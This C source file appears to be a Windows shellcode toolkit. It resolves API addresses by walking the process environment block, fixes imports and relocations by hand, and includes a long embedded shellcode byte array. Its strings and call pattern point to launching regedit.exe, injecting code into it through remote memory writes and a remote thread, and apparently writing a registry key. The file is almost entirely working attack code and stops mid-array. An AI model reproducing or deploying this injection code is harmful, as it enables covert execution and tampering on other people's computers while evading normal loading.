﻿#include <windows.h>

typedef HMODULE(WINAPI* pGetModuleHandle)(
	_In_ LPCSTR lpLibFileName
	);
pGetModuleHandle ReGetModuleHandle;

typedef HMODULE(WINAPI* pReLoadLibrary)(
	_In_ LPCSTR lpLibFileName
	);
pReLoadLibrary ReLoadLibrary;

typedef FARPROC(WINAPI *pGetProcAddress)(
	_In_ HMODULE hModule,
	_In_ LPCSTR lpProcName
	);
pGetProcAddress ReGetProcAddress;

DWORD GetKernel32Address() {
	DWORD dwKernel32Addr = 0;
	_asm {
		mov eax, fs: [0x30]
		mov eax, [eax + 0x0c]
		mov eax, [eax + 0x14]
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x10]
		mov dwKernel32Addr, eax
	}
	return  dwKernel32Addr;
}

DWORD RGetProcAddress() {
	DWORD dwAddrBase = GetKernel32Address();

	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)dwAddrBase;

	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos->e_lfanew + dwAddrBase);

	PIMAGE_DATA_DIRECTORY pDataDir = pNt->OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT;

	PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(dwAddrBase + pDataDir->VirtualAddress);

	DWORD dwFunCount = pExport->NumberOfFunctions;

	DWORD dwFunNameCount = pExport->NumberOfNames;

	PDWORD pAddrOfFun = (PDWORD)(pExport->AddressOfFunctions + dwAddrBase);

	PDWORD pAddrOfNames = (PDWORD)(pExport->AddressOfNames + dwAddrBase);

	PWORD pAddrOfOrdinals = (PWORD)(pExport->AddressOfNameOrdinals + dwAddrBase);
	for (size_t i = 0; i < dwFunCount; i++) {
		if (!pAddrOfFun[i]) {
			continue;
		}
		DWORD dwFunAddrOffset = pAddrOfFun[i];
		for (size_t j = 0; j < dwFunNameCount; j++) {
			if (pAddrOfOrdinals[j] == i) {
				DWORD dwNameOffset = pAddrOfNames[j];
				char * pFunName = (char *)(dwAddrBase + dwNameOffset);
				if (strcmp(pFunName, "GetProcAddress") == 0) {
					return dwFunAddrOffset + dwAddrBase;
				}
			}
		}
	}
}

void getAPIBaseAddr()
{
	HMODULE hKernel32 = (HMODULE)GetKernel32Address();

	ReGetProcAddress = (pGetProcAddress)RGetProcAddress();

	ReGetModuleHandle = (pGetModuleHandle)ReGetProcAddress(hKernel32, "GetModuleHandleA");

	ReLoadLibrary = (pGetModuleHandle)ReGetProcAddress(hKernel32, "LoadLibraryA");
}

__declspec(noinline) ULONG_PTR caller(VOID) { return (ULONG_PTR)_ReturnAddress(); }

void fixIatAndReloc(DWORD imageBase)
{
	DWORD relocBeginOffset = 0x99999999;
	DWORD relocEndOffset = 0x88888888;

	if (relocBeginOffset != 0x99999999)
	{
		for (DWORD i = relocBeginOffset; i <= relocEndOffset; i += 2)
		{
			(*(PDWORD)(imageBase + *(PWORD)(imageBase + i))) += imageBase;
		}
	}

	DWORD iatInfoOffset = 0x77777777;
	DWORD iatBeginOffset = 0x66666666;

	if (iatInfoOffset != 0x77777777)
	{
		getAPIBaseAddr();

		DWORD index = imageBase + iatInfoOffset;
		BYTE split;
		BOOL flag = TRUE;
		HMODULE dllBase = NULL;

		while (1)
		{
			if (flag)
			{
				char* dllName = index;
				dllBase = ReGetModuleHandle(dllName);
				if (!dllBase)
					dllBase = ReLoadLibrary(dllName);

				index += (strlen(dllName) + 1);
			}

			split = *(PBYTE)(index);


			if (split == '\x2C')
			{
				char* apiName = (char*)(index + 1);
				*(PDWORD)(imageBase + iatBeginOffset) = ReGetProcAddress(dllBase, apiName);
				iatBeginOffset += 4;
				index += (strlen(apiName) + 1) + 1;

				flag = FALSE;
			}
			else if (split == '\x3B')
			{
				index++;
				flag = TRUE;
			}
			else {
				break;
			}
		}
	}
}

void strat(LPVOID param)
{
	//这里放需要生成的shellcode代码，可以放在多个函数中，只要被引用即可。
	runRegEditAndInject(param);//参数可带不可带，带了参数是接收远程线程创建的时给的参数
}

void testShellcodeRun()
{
	unsigned char buf[] = "\x55\x8b\xec\x83\xec\x08\xe8\x23\x00\x00\x00\x89\x45\xfc\x8b\x45\xfc\x25\x00\xf0\xff\xff\x89\x45\xf8\x8b\x4d\xf8\x51\xe8\x14\x00\x00\x00\x83\xc4\x04\x8b\x55\x08\x52\xe8\x85\x03\x00\x00\x55\x8b\xec\x8b\x45\x04\x5d\xc3\x55\x8b\xec\x83\xec\x44\xc7\x45\xd8\x78\x15\x00\x00\xc7\x45\xcc\xac\x15\x00\x00\x81\x7d\xd8\x99\x99\x99\x99\x74\x3f\x8b\x45\xd8\x89\x45\xf4\xeb\x09\x8b\x4d\xf4\x83\xc1\x02\x89\x4d\xf4\x8b\x55\xf4\x3b\x55\xcc\x77\x26\x0f\xae\xe8\x8b\x45\x08\x03\x45\xf4\x0f\xb7\x08\x8b\x55\x08\x8b\x04\x0a\x03\x45\x08\x8b\x4d\x08\x03\x4d\xf4\x0f\xb7\x11\x8b\x4d\x08\x89\x04\x11\xeb\xc9\xc7\x45\xd4\xe0\x14\x00\x00\xc7\x45\xe0\x5c\x15\x00\x00\x81\x7d\xd4\x77\x77\x77\x77\x0f\x84\x27\x01\x00\x00\xe8\x26\x01\x00\x00\x8b\x55\x08\x03\x55\xd4\x89\x55\xf8\xc7\x45\xdc\x01\x00\x00\x00\xc7\x45\xe8\x00\x00\x00\x00\xb8\x01\x00\x00\x00\x85\xc0\x0f\x84\xfe\x00\x00\x00\x83\x7d\xdc\x00\x74\x5d\x8b\x4d\xf8\x89\x4d\xe4\x8b\x55\xe4\x52\xff\x15\xf8\x07\x00\x00\x89\x45\xe8\x83\x7d\xe8\x00\x75\x0d\x8b\x45\xe4\x50\xff\x15\xfc\x07\x00\x00\x89\x45\xe8\x8b\x4d\xe4\x89\x4d\xf0\x8b\x55\xf0\x83\xc2\x01\x89\x55\xc8\x8b\x45\xf0\x8a\x08\x88\x4d\xfe\x83\x45\xf0\x01\x80\x7d\xfe\x00\x75\xee\x8b\x55\xf0\x2b\x55\xc8\x89\x55\xc4\x8b\x45\xc4\x8b\x4d\xf8\x8d\x54\x01\x01\x89\x55\xf8\x8b\x45\xf8\x8a\x08\x88\x4d\xff\x0f\xb6\x55\xff\x83\xfa\x2c\x75\x68\x8b\x45\xf8\x83\xc0\x01\x89\x45\xd0\x8b\x4d\xd0\x51\x8b\x55\xe8\x52\xff\x15\x00\x08\x00\x00\x8b\x4d\x08\x03\x4d\xe0\x89\x01\x8b\x55\xe0\x83\xc2\x04\x89\x55\xe0\x8b\x45\xd0\x89\x45\xec\x8b\x4d\xec\x83\xc1\x01\x89\x4d\xc0\x8b\x55\xec\x8a\x02\x88\x45\xfd\x83\x45\xec\x01\x80\x7d\xfd\x00\x75\xee\x8b\x4d\xec\x2b\x4d\xc0\x89\x4d\xbc\x8b\x55\xbc\x8b\x45\xf8\x8d\x4c\x10\x02\x89\x4d\xf8\xc7\x45\xdc\x00\x00\x00\x00\xeb\x1d\x0f\xb6\x55\xff\x83\xfa\x3b\x75\x12\x8b\x45\xf8\x83\xc0\x01\x89\x45\xf8\xc7\x45\xdc\x01\x00\x00\x00\xeb\x02\xeb\x05\xe9\xf5\xfe\xff\xff\x8b\xe5\x5d\xc3\x55\x8b\xec\x51\xe8\x39\x00\x00\x00\x89\x45\xfc\xe8\x6f\x00\x00\x00\xa3\x00\x08\x00\x00\x68\x04\x08\x00\x00\x8b\x45\xfc\x50\xff\x15\x00\x08\x00\x00\xa3\xf8\x07\x00\x00\x68\x18\x08\x00\x00\x8b\x4d\xfc\x51\xff\x15\x00\x08\x00\x00\xa3\xfc\x07\x00\x00\x8b\xe5\x5d\xc3\x55\x8b\xec\x83\xec\x08\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc7\x45\xf8\x00\x00\x00\x00\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x40\x14\x8b\x00\x8b\x00\x8b\x40\x10\x89\x45\xf8\x8b\x45\xf8\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x8b\xe5\x5d\xc3\x55\x8b\xec\x83\xec\x50\xe8\xb7\xff\xff\xff\x89\x45\xf8\x8b\x45\xf8\x89\x45\xd8\x8b\x4d\xd8\x8b\x51\x3c\x03\x55\xf8\x89\x55\xd4\x8b\x45\xd4\x83\xc0\x78\x89\x45\xd0\x8b\x4d\xd0\x8b\x55\xf8\x03\x11\x89\x55\xf0\x8b\x45\xf0\x8b\x48\x14\x89\x4d\xcc\x8b\x55\xf0\x8b\x42\x18\x89\x45\xc8\x8b\x4d\xf0\x8b\x51\x1c\x03\x55\xf8\x89\x55\xe0\x8b\x45\xf0\x8b\x48\x20\x03\x4d\xf8\x89\x4d\xc0\x8b\x55\xf0\x8b\x42\x24\x03\x45\xf8\x89\x45\xc4\xc7\x45\xf4\x00\x00\x00\x00\xeb\x09\x8b\x4d\xf4\x83\xc1\x01\x89\x4d\xf4\x8b\x55\xf4\x3b\x55\xcc\x0f\x83\xcf\x00\x00\x00\x8b\x45\xf4\x8b\x4d\xe0\x83\x3c\x81\x00\x75\x02\xeb\xdd\x8b\x55\xf4\x8b\x45\xe0\x8b\x0c\x90\x89\x4d\xb0\xc7\x45\xec\x00\x00\x00\x00\xeb\x09\x8b\x55\xec\x83\xc2\x01\x89\x55\xec\x8b\x45\xec\x3b\x45\xc8\x0f\x83\x92\x00\x00\x00\x8b\x4d\xec\x8b\x55\xc4\x0f\xb7\x04\x4a\x3b\x45\xf4\x75\x7e\x0f\xae\xe8\x8b\x4d\xec\x8b\x55\xc0\x8b\x04\x8a\x89\x45\xbc\x8b\x4d\xf8\x03\x4d\xbc\x89\x4d\xb8\xc7\x45\xe4\x28\x08\x00\x00\x8b\x55\xb8\x89\x55\xe8\x8b\x45\xe8\x8a\x08\x88\x4d\xff\x8b\x55\xe4\x3a\x0a\x75\x2e\x80\x7d\xff\x00\x74\x1f\x8b\x45\xe8\x8a\x48\x01\x88\x4d\xfe\x8b\x55\xe4\x3a\x4a\x01\x75\x17\x83\x45\xe8\x02\x83\x45\xe4\x02\x80\x7d\xfe\x00\x75\xcc\xc7\x45\xdc\x00\x00\x00\x00\xeb\x08\x1b\xc0\x83\xc8\x01\x89\x45\xdc\x8b\x4d\xdc\x89\x4d\xb4\x83\x7d\xb4\x00\x75\x08\x8b\x45\xb0\x03\x45\xf8\xeb\x0a\xe9\x59\xff\xff\xff\xe9\x1c\xff\xff\xff\x8b\xe5\x5d\xc3\x55\x8b\xec\x8b\x45\x08\x50\xe8\x00\x00\x00\x00\x55\x8b\xec\x51\xe8\x21\x00\x00\x00\x89\x45\xfc\x83\x7d\xfc\x00\x74\x10\x8b\x45\x08\x50\x8b\x4d\xfc\x51\xe8\x15\x02\x00\x00\x83\xc4\x08\x6a\x00\xff\x15\x5c\x15\x00\x00\x55\x8b\xec\x81\xec\x84\x00\x00\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x8d\x45\xc8\x50\xff\x15\x60\x15\x00\x00\x0f\xb7\x4d\xc8\x83\xf9\x09\x74\x09\x0f\xb7\x55\xc8\x83\xfa\x06\x75\x0c\xc7\x85\x7c\xff\xff\xff\x38\x08\x00\x00\xeb\x0a\xc7\x85\x7c\xff\xff\xff\x58\x08\x00\x00\x33\xc0\x89\x45\xec\x89\x45\xf0\x89\x45\xf4\x89\x45\xf8\x6a\x44\x6a\x00\x8d\x4d\x84\x51\xe8\x50\x00\x00\x00\x83\xc4\x0c\xc7\x45\x84\x44\x00\x00\x00\x8d\x55\xec\x52\x8d\x45\x84\x50\x6a\x00\x6a\x00\x68\x04\x00\x00\x08\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x8b\x8d\x7c\xff\xff\xff\x51\xff\x15\x64\x15\x00\x00\x89\x45\x80\x83\x7d\x80\x00\x74\x06\x8b\x55\xf4\x89\x55\x80\x8b\x45\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x8b\xe5\x5d\xc3\x8b\x4c\x24\x0c\x0f\xb6\x44\x24\x08\x8b\xd7\x8b\x7c\x24\x04\x85\xc9\x0f\x84\x3c\x01\x00\x00\x69\xc0\x01\x01\x01\x01\x83\xf9\x20\x0f\x86\xdf\x00\x00\x00\x81\xf9\x80\x00\x00\x00\x0f\x82\x8b\x00\x00\x00\x0f\xba\x25\x70\x08\x00\x00\x01\x73\x09\xf3\xaa\x8b\x44\x24\x04\x8b\xfa\xc3\x0f\xba\x25\x74\x08\x00\x00\x01\x0f\x83\xb2\x00\x00\x00\x66\x0f\x6e\xc0\x66\x0f\x70\xc0\x00\x03\xcf\x0f\x11\x07\x83\xc7\x10\x83\xe7\xf0\x2b\xcf\x81\xf9\x80\x00\x00\x00\x76\x4c\x8d\xa4\x24\x00\x00\x00\x00\x8d\xa4\x24\x00\x00\x00\x00\x90\x66\x0f\x7f\x07\x66\x0f\x7f\x47\x10\x66\x0f\x7f\x47\x20\x66\x0f\x7f\x47\x30\x66\x0f\x7f\x47\x40\x66\x0f\x7f\x47\x50\x66\x0f\x7f\x47\x60\x66\x0f\x7f\x47\x70\x8d\xbf\x80\x00\x00\x00\x81\xe9\x80\x00\x00\x00\xf7\xc1\x00\xff\xff\xff\x75\xc5\xeb\x13\x0f\xba\x25\x74\x08\x00\x00\x01\x73\x3e\x66\x0f\x6e\xc0\x66\x0f\x70\xc0\x00\x83\xf9\x20\x72\x1c\xf3\x0f\x7f\x07\xf3\x0f\x7f\x47\x10\x83\xc7\x20\x83\xe9\x20\x83\xf9\x20\x73\xec\xf7\xc1\x1f\x00\x00\x00\x74\x62\x8d\x7c\x0f\xe0\xf3\x0f\x7f\x07\xf3\x0f\x7f\x47\x10\x8b\x44\x24\x04\x8b\xfa\xc3\xf7\xc1\x03\x00\x00\x00\x74\x0e\x88\x07\x47\x83\xe9\x01\xf7\xc1\x03\x00\x00\x00\x75\xf2\xf7\xc1\x04\x00\x00\x00\x74\x08\x89\x07\x83\xc7\x04\x83\xe9\x04\xf7\xc1\xf8\xff\xff\xff\x74\x20\x8d\xa4\x24\x00\x00\x00\x00\x8d\x9b\x00\x00\x00\x00\x89\x07\x89\x47\x04\x83\xc7\x08\x83\xe9\x08\xf7\xc1\xf8\xff\xff\xff\x75\xed\x8b\x44\x24\x04\x8b\xfa\xc3\x55\x8b\xec\x81\xec\x9c\x0c\x00\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x56\x57\xb9\x19\x03\x00\x00\xbe\x78\x08\x00\x00\x8d\xbd\x94\xf3\xff\xff\xf3\xa5\xa4\x8b\x45\x08\x50\x6a\x00\x68\xff\xff\x1f\x00\xff\x15\x68\x15\x00\x00\x89\x85\x8c\xf3\xff\xff\x83\xbd\x8c\xf3\xff\xff\x00\x75\x0a\xb8\x01\x00\x00\x00\xe9\xa1\x01\x00\x00\x8b\x4d\x0c\x89\x8d\x88\xf3\xff\xff\x8b\x95\x88\xf3\xff\xff\x83\xc2\x01\x89\x95\x74\xf3\xff\xff\x8b\x85\x88\xf3\xff\xff\x8a\x08\x88\x8d\x93\xf3\xff\xff\x83\x85\x88\xf3\xff\xff\x01\x80\xbd\x93\xf3\xff\xff\x00\x75\xe2\x8b\x95\x88\xf3\xff\xff\x2b\x95\x74\xf3\xff\xff\x89\x95\x70\xf3\xff\xff\x6a\x40\x68\x00\x10\x00\x00\x8b\x85\x70\xf3\xff\xff\x50\x6a\x00\x8b\x8d\x8c\xf3\xff\xff\x51\xff\x15\x6c\x15\x00\x00\x89\x85\x78\xf3\xff\xff\x83\x7d\x0c\x00\x75\x0a\xb8\x01\x00\x00\x00\xe9\x26\x01\x00\x00\x8b\x55\x0c\x89\x95\x84\xf3\xff\xff\x8b\x85\x84\xf3\xff\xff\x83\xc0\x01\x89\x85\x6c\xf3\xff\xff\x8b\x8d\x84\xf3\xff\xff\x8a\x11\x88\x95\x92\xf3\xff\xff\x83\x85\x84\xf3\xff\xff\x01\x80\xbd\x92\xf3\xff\xff\x00\x75\xe2\x8b\x85\x84\xf3\xff\xff\x2b\x85\x6c\xf3\xff\xff\x89\x85\x68\xf3\xff\xff\x6a\x00\x8b\x8d\x68\xf3\xff\xff\x51\x8b\x55\x0c\x52\x8b\x85\x78\xf3\xff\xff\x50\x8b\x8d\x8c\xf3\xff\xff\x51\xff\x15\x70\x15\x00\x00\x89\x85\x80\xf3\xff\xff\x83\xbd\x80\xf3\xff\xff\x00\x75\x0a\xb8\x01\x00\x00\x00\xe9\xa4\x00\x00\x00\x6a\x40\x68\x00\x10\x00\x00\x68\x65\x0c\x00\x00\x6a\x00\x8b\x95\x8c\xf3\xff\xff\x52\xff\x15\x6c\x15\x00\x00\x89\x85\x7c\xf3\xff\xff\x83\xbd\x7c\xf3\xff\xff\x00\x75\x07\xb8\x01\x00\x00\x00\xeb\x73\x6a\x00\x68\x65\x0c\x00\x00\x8d\x85\x94\xf3\xff\xff\x50\x8b\x8d\x7c\xf3\xff\xff\x51\x8b\x95\x8c\xf3\xff\xff\x52\xff\x15\x70\x15\x00\x00\x89\x85\x80\xf3\xff\xff\x83\xbd\x80\xf3\xff\xff\x00\x75\x07\xb8\x01\x00\x00\x00\xeb\x3b\x6a\x00\x6a\x00\x8b\x85\x78\xf3\xff\xff\x50\x8b\x8d\x7c\xf3\xff\xff\x51\x6a\x00\x6a\x00\x8b\x95\x8c\xf3\xff\xff\x52\xff\x15\x74\x15\x00\x00\x89\x85\x64\xf3\xff\xff\x83\xbd\x64\xf3\xff\xff\x00\x75\x07\xb8\x01\x00\x00\x00\xeb\x02\x33\xc0\x5f\x5e\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x8b\xe5\x5d\xc3\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x47\x65\x74\x4d\x6f\x64\x75\x6c\x65\x48\x61\x6e\x64\x6c\x65\x41\x00\x00\x00\x00\x4c\x6f\x61\x64\x4c\x69\x62\x72\x61\x72\x79\x41\x00\x00\x00\x00\x47\x65\x74\x50\x72\x6f\x63\x41\x64\x64\x72\x65\x73\x73\x00\x00\x43\x3a\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x53\x79\x73\x77\x6f\x77\x36\x34\x5c\x72\x65\x67\x65\x64\x69\x74\x2e\x65\x78\x65\x00\x43\x3a\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x72\x65\x67\x65\x64\x69\x74\x2e\x65\x78\x65\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x55\x8b\xec\x83\xec\x08\xe8\x2c\x00\x00\x00\x89\x45\xfc\x8b\x45\xfc\x25\x00\xf0\xff\xff\x89\x45\xf8\x8b\x4d\xf8\x51\xe8\x1d\x00\x00\x00\x83\xc4\x04\x8b\x55\x08\x52\xe8\x0f\x04\x00\x00\x83\xc4\x04\x33\xc0\x8b\xe5\x5d\xc3\x55\x8b\xec\x8b\x45\x04\x5d\xc3\x55\x8b\xec\x83\xec\x2c\xc7\x45\xe0\x34\x0c\x00\x00\xc7\x45\xd4\x64\x0c\x00\x00\x81\x7d\xe0\x99\x99\x99\x99\x74\x3f\x8b\x45\xe0\x89\x45\xf4\xeb\x09\x8b\x4d\xf4\x83\xc1\x02\x89\x4d\xf4\x8b\x55\xf4\x3b\x55\xd4\x77\x26\x0f\xae\xe8\x8b\x45\x08\x03\x45\xf4\x0f\xb7\x08\x8b\x55\x08\x8b\x04\x0a\x03\x45\x08\x8b\x4d\x08\x03\x4d\xf4\x0f\xb7\x11\x8b\x4d\x08\x89\x04\x11\xeb\xc9\xc7\x45\xdc\xb8\x0b\x00\x00\xc7\x45\xe8\x1c\x0c\x00\x00\x81\x7d\xdc\x77\x77\x77\x77\x0f\x84\xe5\x00\x00\x00\xe8\xe4\x00\x00\x00\x8b\x55\x08\x03\x55\xdc\x89\x55\xf8\xc7\x45\xe4\x01\x00\x00\x00\xc7\x45\xf0\x00\x00\x00\x00\xb8\x01\x00\x00\x00\x85\xc0\x0f\x84\xbc\x00\x00\x00\x83\x7d\xe4\x00\x74\x3c\x8b\x4d\xf8\x89\x4d\xec\x8b\x55\xec\x52\xff\x15\x40\x0b\x00\x00\x89\x45\xf0\x83\x7d\xf0\x00\x75\x0d\x8b\x45\xec\x50\xff\x15\x44\x0b\x00\x00\x89\x45\xf0\x8b\x4d\xec\x51\xe8\x9e\x02\x00\x00\x83\xc4\x04\x8b\x55\xf8\x8d\x44\x02\x01\x89\x45\xf8\x8b\x4d\xf8\x8a\x11\x88\x55\xff\x0f\xb6\x45\xff\x83\xf8\x2c\x75\x47\x8b\x4d\xf8\x83\xc1\x01\x89\x4d\xd8\x8b\x55\xd8\x52\x8b\x45\xf0\x50\xff\x15\x48\x0b\x00\x00\x8b\x4d\x08\x03\x4d\xe8\x89\x01\x8b\x55\xe8\x83\xc2\x04\x89\x55\xe8\x8b\x45\xd8\x50\xe8\x4f\x02\x00\x00\x83\xc4\x04\x8b\x4d\xf8\x8d\x54\x01\x02\x89\x55\xf8\xc7\x45\xe4\x00\x00\x00\x00\xeb\x1d\x0f\xb6\x45\xff\x83\xf8\x3b\x75\x12\x8b\x4d\xf8\x83\xc1\x01\x89\x4d\xf8\xc7\x45\xe4\x01\x00\x00\x00\xeb\x02\xeb\x05\xe9\x37\xff\xff\xff\x8b\xe5\x5d\xc3\x55\x8b\xec\x51\xe8\x39\x00\x00\x00\x89\x45\xfc\xe8\x6f\x00\x00\x00\xa3\x48\x0b\x00\x00\x68\x4c\x0b\x00\x00\x8b\x45\xfc\x50\xff\x15\x48\x0b\x00\x00\xa3\x40\x0b\x00\x00\x68\x60\x0b\x00\x00\x8b\x4d\xfc\x51\xff\x15\x48\x0b\x00\x00\xa3\x44\x0b\x00\x00\x8b\xe5\x5d\xc3\x55\x8b\xec\x83\xec\x08\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc7\x45\xf8\x00\x00\x00\x00\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x40\x14\x8b\x00\x8b\x00\x8b\x40\x10\x89\x45\xf8\x8b\x45\xf8\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x8b\xe5\x5d\xc3\x55\x8b\xec\x83\xec\x3c\xe8\xb7\xff\xff\xff\x89\x45\xfc\x8b\x45\xfc\x89\x45\xe8\x8b\x4d\xe8\x8b\x51\x3c\x03\x55\xfc\x89\x55\xe4\x8b\x45\xe4\x83\xc0\x78\x89\x45\xe0\x8b\x4d\xe0\x8b\x55\xfc\x03\x11\x89\x55\xf4\x8b\x45\xf4\x8b\x48\x14\x89\x4d\xdc\x8b\x55\xf4\x8b\x42\x18\x89\x45\xd8\x8b\x4d\xf4\x8b\x51\x1c\x03\x55\xfc\x89\x55\xec\x8b\x45\xf4\x8b\x48\x20\x03\x4d\xfc\x89\x4d\xd0\x8b\x55\xf4\x8b\x42\x24\x03\x45\xfc\x89\x45\xd4\xc7\x45\xf8\x00\x00\x00\x00\xeb\x09\x8b\x4d\xf8\x83\xc1\x01\x89\x4d\xf8\x8b\x55\xf8\x3b\x55\xdc\x73\x7f\x8b\x45\xf8\x8b\x4d\xec\x83\x3c\x81\x00\x75\x02\xeb\xe1\x8b\x55\xf8\x8b\x45\xec\x8b\x0c\x90\x89\x4d\xc4\xc7\x45\xf0\x00\x00\x00\x00\xeb\x09\x8b\x55\xf0\x83\xc2\x01\x89\x55\xf0\x8b\x45\xf0\x3b\x45\xd8\x73\x46\x8b\x4d\xf0\x8b\x55\xd4\x0f\xb7\x04\x4a\x3b\x45\xf8\x75\x35\x0f\xae\xe8\x8b\x4d\xf0\x8b\x55\xd0\x8b\x04\x8a\x89\x45\xcc\x8b\x4d\xfc\x03\x4d\xcc\x89\x4d\xc8\x68\x70\x0b\x00\x00\x8b\x55\xc8\x52\xe8\x1a\x00\x00\x00\x83\xc4\x08\x85\xc0\x75\x08\x8b\x45\xc4\x03\x45\xfc\xeb\x07\xeb\xa9\xe9\x70\xff\xff\xff\x8b\xe5\x5d\xc3\x8b\x54\x24\x04\x8b\x4c\x24\x08\xf7\xc2\x03\x00\x00\x00\x75\x40\x8b\x02\x3a\x01\x75\x32\x84\xc0\x74\x26\x3a\x61\x01\x75\x29\x84\xe4\x74\x1d\xc1\xe8\x10\x3a\x41\x02\x75\x1d\x84\xc0\x74\x11\x3a\x61\x03\x75\x14\x83\xc1\x04\x83\xc2\x04\x84\xe4\x75\xd2\x8b\xff\x33\xc0\xc3\xeb\x03\xcc\xcc\xcc\x1b\xc0\x83\xc8\x01\xc3\x8b\xff\xf7\xc2\x01\x00\x00\x00\x74\x18\x8a\x02\x83\xc2\x01\x3a\x01\x75\xe7\x83\xc1\x01\x84\xc0\x74\xd8\xf7\xc2\x02\x00\x00\x00\x74\xa0\x66\x8b\x02\x83\xc2\x02\x3a\x01\x75\xce\x84\xc0\x74\xc2\x3a\x61\x01\x75\xc5\x84\xe4\x74\xb9\x83\xc1\x02\xeb\x84\x8b\x4c\x24\x04\xf7\xc1\x03\x00\x00\x00\x74\x24\x8a\x01\x83\xc1\x01\x84\xc0\x74\x4e\xf7\xc1\x03\x00\x00\x00\x75\xef\x05\x00\x00\x00\x00\x8d\xa4\x24\x00\x00\x00\x00\x8d\xa4\x24\x00\x00\x00\x00\x8b\x01\xba\xff\xfe\xfe\x7e\x03\xd0\x83\xf0\xff\x33\xc2\x83\xc1\x04\xa9\x00\x01\x01\x81\x74\xe8\x8b\x41\xfc\x84\xc0\x74\x32\x84\xe4\x74\x24\xa9\x00\x00\xff\x00\x74\x13\xa9\x00\x00\x00\xff\x74\x02\xeb\xcd\x8d\x41\xff\x8b\x4c\x24\x04\x2b\xc1\xc3\x8d\x41\xfe\x8b\x4c\x24\x04\x2b\xc1\xc3\x8d\x41\xfd\x8b\x4c\x24\x04\x2b\xc1\xc3\x8d\x41\xfc\x8b\x4c\x24\x04\x2b\xc1\xc3\x55\x8b\xec\x83\xec\x54\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x56\x57\xb9\x0b\x00\x00\x00\xbe\x80\x0b\x00\x00\x8d\x7d\xcc\xf3\xa5\x66\xa5\x8b\x45\x08\x50\xe8\x49\xff\xff\xff\x83\xc4\x04\x89\x45\xac\xc7\x45\xc4\x00\x00\x00\x00\xc7\x45\xc0\x00\x00\x00\x00\xc7\x45\xbc\x00\x00\x00\x00\xeb\x09\x8b\x4d\xc4\x83\xc1\x01\x89\x4d\xc4\x8b\x55\xc4\x3b\x55\xac\x0f\x8d\x87\x00\x00\x00\x8b\x45\x08\x03\x45\xc4\x0f\xbe\x08\x83\xf9\x3b\x75\x74\x8b\x55\x08\x03\x55\xc4\x0f\xbe\x42\x01\x83\xf8\x3b\x75\x65\x68\xff\x00\x00\x00\x6a\x00\xff\x15\x1c\x0c\x00\x00\x50\xff\x15\x20\x0c\x00\x00\x8b\x4d\xc0\x89\x44\x8d\xb0\x8b\x55\xc4\x2b\x55\xbc\x52\x8b\x45\x08\x03\x45\xbc\x50\x8b\x4d\xc0\x8b\x54\x8d\xb0\x52\xe8\xdd\x00\x00\x00\x83\xc4\x0c\x8b\x45\xc4\x2b\x45\xbc\x8b\x4d\xc0\x8b\x54\x8d\xb0\xc6\x04\x02\x00\x8b\x45\xc4\x83\xc0\x02\x89\x45\xbc\x8b\x4d\xc0\x83\xc1\x01\x89\x4d\xc0\x8b\x55\xc4\x83\xc2\x01\x89\x55\xc4\xe9\x64\xff\xff\xff\x68\xb8\x0b\x00\x00\xff\x15\x24\x0c\x00\x00\x8d\x45\xc8\x50\x68\x02\x01\x00\x00\x6a\x00\x8d\x4d\xcc\x51\x68\x02\x00\x00\x80\xff\x15\x28\x0c\x00\x00\x89\x45\xb8\x83\x7d\xb8\x00\x74\x07\xb8\x01\x00\x00\x00\xeb\x64\xba\x04\x00\x00\x00\xc1\xe2\x00\x8b\x44\x15\xb0\x50\xe8\x49\xfe\xff\xff\x83\xc4\x04\x50\xb9\x04\x00\x00\x00\xc1\xe1\x00\x8b\x54\x0d\xb0\x52\x6a\x01\x6a\x00\xb8\x04\x00\x00\x00\x6b\xc8\x00\x8b\x54\x0d\xb0\x52\x8b\x45\xc8\x50\xff\x15\x2c\x0c\x00\x00\x89\x45\xb8\x83\x7d\xb8\x00\x74\x11\x8b\x4d\xc8\x51\xff\x15\x30\x0c\x00\x00\xb8\x01\x00\x00\x00\xeb\x0c\x8b\x55\xc8\x52\xff\x15\x30\x0c\x00\x00\x33\xc0\x5f\x5e\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x8b\xe5\x5d\xc3\x57\x56\x8b\x74\x24\x10\x8b\x4c\x24\x14\x8b\x7c\x24\x0c\x8b\xc1\x8b\xd1\x03\xc6\x3b\xfe\x76\x08\x3b\xf8\x0f\x82\x94\x02\x00\x00\x83\xf9\x20\x0f\x82\xd2\x04\x00\x00\x81\xf9\x80\x00\x00\x00\x73\x13\x0f\xba\x25\xb0\x0b\x00\x00\x01\x0f\x82\x8e\x04\x00\x00\xe9\xe3\x01\x00\x00\x0f\xba\x25\xb4\x0b\x00\x00\x01\x73\x09\xf3\xa4\x8b\x44\x24\x0c\x5e\x5f\xc3\x8b\xc7\x33\xc6\xa9\x0f\x00\x00\x00\x75\x0e\x0f\xba\x25\xb0\x0b\x00\x00\x01\x0f\x82\xe0\x03\x00\x00\x0f\xba\x25\xb4\x0b\x00\x00\x00\x0f\x83\xa9\x01\x00\x00\xf7\xc7\x03\x00\x00\x00\x0f\x85\x9d\x01\x00\x00\xf7\xc6\x03\x00\x00\x00\x0f\x85\xac\x01\x00\x00\x0f\xba\xe7\x02\x73\x0d\x8b\x06\x83\xe9\x04\x8d\x76\